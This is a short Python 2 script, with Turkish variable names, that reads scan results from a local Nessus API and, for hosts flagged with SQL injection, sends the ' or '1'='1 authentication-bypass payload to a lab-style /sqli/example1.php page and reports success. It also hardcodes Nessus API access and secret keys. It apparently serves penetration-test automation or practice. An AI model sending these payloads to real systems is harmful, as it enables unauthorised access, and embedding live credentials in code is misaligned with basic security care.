import requests
header={"X-ApiKeys": "accessKey=43f5028cc9bb28689e4e562f5253d481f5c036385fece14d2e4a4eedf5edaeaa; secretKey=cb421e681849eedc09e9610d7ef258ee49881bb858119ddbf2fcf75df6f6c016;"}
url="https://127.0.0.1:8834/folders"
sonuc=requests.get(url=url,headers=header,verify=False)
for i in sonuc.json()['folders']:
    try:
        if "13052018" in i['name']:
            print "Kurumadi:",str(i['name']).split("_")[0]
            print "Tarama adi:", str(i['name']).split("_")[1]
            print "========="
    except:
        pass
url="https://127.0.0.1:8834/scans"
sonuc=requests.get(url=url,headers=header,verify=False).json()['scans']
print "======"
for i in sonuc:
    idTarama=str(i['id'])
    url = "https://127.0.0.1:8834/scans/"+idTarama
    sonuc = requests.get(url=url, headers=header, verify=False).json()
    try:
        for i in sonuc['vulnerabilities']:
            if "CGI Generic SQL Injection" in i['plugin_name']:
                print i['plugin_name']
                url2="http://"+str(sonuc['info']['targets'])+"/sqli/example1.php?name=' or '1'='1"
                print url
                sonuc2 = requests.get(url2)
                print sonuc2.content
                if "admin" in sonuc2.content:
                    print "[+]SQLi var:", "' or '1'='1"
    except:
        pass
    # try:
    #     for j in range(1,3,1):
    #         url = "https://127.0.0.1:8834/scans/"+idTarama+"/hosts/"+str(j)+"/plugins/11936"
    #         sonuc = requests.get(url=url, headers=header, verify=False).json()
    #         print sonuc['outputs'][0]['plugin_output']
    # except:
    #     pass